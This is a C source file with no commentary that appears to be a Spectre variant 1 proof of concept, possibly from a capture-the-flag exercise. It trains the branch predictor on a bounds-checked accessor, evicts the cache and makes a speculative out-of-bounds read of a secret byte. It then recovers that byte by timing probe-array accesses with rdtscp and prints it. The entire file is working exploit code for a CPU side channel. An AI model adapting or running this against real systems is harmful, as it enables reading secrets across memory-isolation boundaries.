#include <emmintrin.h>
#include <sys/mman.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

char *the_vm;

uint8_t restrictedAccess(size_t x)
{
    if (x < *(unsigned long*)the_vm) {
        return the_vm[x+8];
    } else {
        return 0;
    }
}

int main(int arg, char **argv) {
    FILE *in = fopen(argv[1], "r");
    char line[0x20];
    fgets(line, 0x20, in);
    char *vm = calloc(0x1, 0x1030);
    memcpy(&vm[0x1020], line, strlen(line));
    *(unsigned long*)vm = 0x1000;

    char *code = mmap((void *)0x133700000000, 0x400000, 3, 34, -1, 0);
    char *addr = mmap((void *)0x414100000000, 0x2000000, 3, 34, -1, 0);
    memset((void *)0x133700000000, 0xCC, 0x400000);

    the_vm = vm;
    size_t larger_x = 0x1018;
    int i;
    uint8_t s;

    for (i = 0; i < 0x100; i++) {
        addr[i*4096] = 1;
    }

    int ch = 0;
    int count = 0;
    while (1) {

        for (i = 0; i < 66; i++) {
            restrictedAccess(i);
        }

        for (i = 0x800000; i < 2*0x800000; i++) {
            addr[i] = 1;
        }

        s = restrictedAccess(larger_x);
        addr[s*4096] = 88;

        int junk=0;
        uint64_t time1, time2;
        char *addr2;
        int cnt = 0;
        int res = 0;
        for (i = 0x20; i < 0x80; i++){
            addr2 = &addr[i*4096];
            time1 = __rdtscp(&junk);
            junk = *addr2;
            time2 = __rdtscp(&junk) - time1;
            *(unsigned long *)(0x414100000000 + i*8) = time2;
        }

        unsigned long min = -1;
        for (i = 0x20; i < 0x80; i++) {
            unsigned long tmp = *(unsigned long *)(0x414100000000 + i*8);
            if (tmp < min) {
                ch = i;
                min = tmp;
            }
        }

        if (min < 60) break;
        count++;
    }

    printf("%c, %d\n", ch, count);
    fwrite((const void *)0x414100000000, 1, 0x1000, stdout);
    return 0;
}
